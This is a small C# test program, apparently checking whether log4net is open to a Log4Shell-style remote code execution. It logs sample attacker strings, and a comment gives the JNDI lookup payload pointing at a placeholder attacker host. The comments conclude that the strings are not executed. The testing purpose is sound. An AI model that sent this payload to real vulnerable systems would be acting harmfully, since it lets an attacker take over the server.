using log4net;
using System.Reflection;

namespace Log4ShellFrameworkRepo
{
    /// <summary>
    /// https://stackify.com/log4net-guide-dotnet-logging/
    /// </summary>
    class Program
    {
        private static readonly ILog Log = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);

        static void Main(string[] args)
        {
            var attackerInput = "telnet my-attacker.com";

            // This line triggers the RCE by logging the attacker-controlled input.
            // The attacker can set their input to: ${jndi:ldap://attacker.com/a}
            Log.Info($"field attacker used :{attackerInput}");
            Log.Info($"{attackerInput}");

            attackerInput = "mkdir hacked";
            Log.Debug(attackerInput);
            // if the input is executed as a shell script like it is in Java,
            // then we should see a directory 'hacked' in the .net5/debug directory
            // (which we don't)
        }
    }
}
